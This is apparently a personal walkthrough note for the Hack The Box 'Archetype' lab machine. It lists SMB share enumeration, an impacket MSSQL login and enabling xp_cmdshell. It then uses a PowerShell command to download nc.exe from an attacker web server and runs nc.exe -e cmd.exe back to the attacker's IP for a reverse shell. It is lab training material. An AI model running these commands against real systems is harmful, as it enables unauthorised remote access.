# Archetype
---
- use nmap to scan for open ports
- smbclient -N -L \\\\10.129.165.218\\ to list shares 
- inspect if there is any non-Administrative share
- connect to db (if known pass and username)
```bash
impacket-mssqlclient -p 1433 <HOST>/<USER>@ADDRESS -windows-auth
```

- make shell `enable_xp_cmdshell`
- test with `xp_cmdshell whoami`
- launch  web server on attacker machine and prepare `nc.exe` to send
- receive nc.exe through web server ``
```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<addresss_of_webserver_with_nc>/nc.exe -outfile nc.exe"
```
- setup nc listener on attacker machine 
```bash
nc -lvnp 4433
```

- connect back to host enabling revers shell
```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; .\nc.exe -e cmd.exe <attacker_ip> 4433 "
```
- find user flag
- send [[PEASS Priv Escal]] to the victim machine
- find admin password 

##### Note:
---
SMB non-Administrative share does NOT have `$` at the end 
